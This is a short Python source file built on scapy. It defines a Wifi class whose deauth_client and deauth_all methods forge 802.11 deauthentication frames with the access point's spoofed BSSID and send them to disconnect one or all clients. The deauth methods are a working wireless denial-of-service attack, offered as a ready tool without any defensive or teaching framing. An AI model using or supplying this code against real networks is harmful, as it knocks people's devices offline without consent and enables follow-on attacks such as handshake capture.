from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp


class Wifi:
    def __init__(self, SSID, BSSID, dBm_signal, channel, crypto):
        self.SSID: str = SSID
        self.BSSID: str = BSSID
        self.dBm_signal: str = dBm_signal
        self.channel: int = channel
        self.crypto: str = crypto
        self.beacon_interval: int
        self.bitrate: int
        self.frequency_band: str
        self.clients: list

    def __eq__(self, other):
        if (isinstance(other, Wifi)):
            return self.SSID == other.SSID
        return False

    def __str__(self) -> str:
        return self.SSID

    def __repr__(self):
        return str(self)

    def deauth_client(self, iface: str, target_mac: str, reason: int = 7) -> None:
        """Deauthenticate a specific client from a wifi

        Args:
            iface (str): The interface to send deauth packet
            target_mac (str): MAC address for the client to be targeted
            reason (int, optional): Reasoncode for deauthentication. Defaults to 7.
        """
        packet = RadioTap() / \
            Dot11(type=0, subtype=12, addr1=target_mac, addr2=self.BSSID, addr3=self.BSSID) / \
            Dot11Deauth(reason=reason)

        print("Created deauth packet")
        print("Sending deauth packet")
        sendp(packet, iface=iface)
        print("Deauth was sent successfully")

    def deauth_all(self, iface: str, reason: int = 6) -> None:
        """Deauthenticate all clients registered on wifi

        Args:
            iface (str): Interface to send deauth packets
            reason (int, optional): Reasoncade for deauthentication. Defaults to 6.
        """
        for client in self.clients:
            self.deauth_client(iface, client, reason=reason)
